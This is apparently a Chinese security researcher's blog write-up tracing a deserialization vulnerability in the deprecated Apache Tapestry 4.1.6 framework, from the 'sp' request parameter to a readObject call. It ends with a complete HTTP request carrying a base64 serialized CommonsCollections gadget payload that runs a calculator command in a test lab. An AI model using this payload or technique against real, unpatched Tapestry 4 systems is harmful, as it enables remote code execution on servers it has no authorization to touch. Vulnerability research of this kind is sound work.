# tapestry4反序列化漏洞寻找之旅
## 前言
某次师傅们在hvv，找到一个网站发现了apache 的tapestry框架，版本号是4.1.6。关于tapestry 4.1.6是tapestry4的最后一个版本，一个很旧的框架，后续就只有tapestry5还在维护了。网上能找到的关于tapestry反序列化的poc的都是关于tapestry5的，这两个大版本之间应该有很大的差别。刚开始的时候我也拿着tapestry5的复现了半天，发现很多地方和目标系统不符合，后来才发现tapestry4和tapestry5天差地别。

在google上找了半天也没有发现有任何可以直接用的poc，关于tapestry4的反序列化漏洞只发现了有下面这段描述。
![](images/1.png)

Apache貌似也说他不干了，不修了。因为tapestry4已经被弃用了，网上也找不到特别多的资料。那咋办？只能硬着头皮，撸个源码了。🤓
- - - -
## 源码分析
由于对这个框架完全不了解，而且当时时间有限，多次搭建都报错，遂在github上找了一个保加利亚老哥写的tapestry4项目，我们秉持着能用就行的原则。tomcat起👾

- - - -
### 入口
反编译出`tapestry-framework-4.1.6.jar`源码，方便搜索查看。
搜索一下获取到request中sp参数的地方，貌似一下就找到入口了。
`org.apache.tapestry.services.impl.LinkFactoryImpl#extractListenerParameters`，很标准的获取前端传入的sp参数。
![](images/2.png)

发送如下的请求包：
![](images/3.png)

从doPost一路跟到`org.apache.tapestry.engine.AbstractEngine#service`
会根据参数中的service参数值调用到相应的service的service方法

![](images/4.png)

我们请求的service为direct，所以进入了directService的service方法中 

![](images/5.png)

紧接着就进入到`org.apache.tapestry.services.impl.LinkFactoryImpl#extractListenerParameters`中
![](images/6.png)
获取到sp的参数，进入`org.apache.tapestry.util.io.DataSqueezerImpl#unsqueeze(java.lang.String)`的方法

![](images/7.png)
获取到sp参数的第一个字符，判断是否已X开头，然后以ASCII码减去33。作为参数获取到`this._adaptorByPrefix`的其中一个元素，并去执行该类的unsqueeze方法
![](images/8.png)


我们需要的readObject方法就在`org.apache.tapestry.util.io.SerializableAdaptor#unsqueeze`中。该类刚好位于`this._adaptorByPrefix`中的第46或者57位，经过ASCII的运算我们可以使用大写的`O`。跳转到我们的`org.apache.tapestry.util.io.SerializableAdaptor#unsqueeze`中先进行base64解码，然后会去执行反序列化。

![](images/9.png)

从pom.xml中可以看到`Tapestry4`自带了`commons-fileupload-1.2.1.jar`，可以利用fileupload1的反序列化链进行写文件。
![](images/10.png)
可以使用ysoserial生成FileUpload1的poc
![](images/14.png)
![](images/11.png)
![](images/12.png)

在靶场环境中添加`commons-collections3.1.jar`依赖，利用CommonsCollectionsK3弹个计算器
![](images/15.png)

![](images/13.png)

使用的请求:
```
POST /app HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1930
Cookie: Idea-f6c80753=e3e1c01e-3ef1-41a1-a4fc-7b04ac32c488


formids=&seedids=ZH4sIAAAAAAAAADWMsQ2AMAwEadiEMkWWgD2i2EJGxI5sCxiK1dgBAqL5v%2BL%2Bz6vr96PbgqFulHGIoaa5VZZShZH9ZfZEjPqwoRkJN6pPEPwKtJWTr60BLStV%2F0xI%2Fj6rLJh9BPJJtAzxBlUfINJ%2BAAAA&component=projectEditForm&page=Home&service=direct&submitmode=&submitname=&sp=OrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAABdnNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2BAAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo%2F2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB%2BABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5%2Bkde0cCAAB4cAAAAAF0ABJvcGVuIC1hIGNhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAAAeHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg%3D
```
- - - -
## 总结
看了好久，还是太菜了。

![](images/cai.jpeg)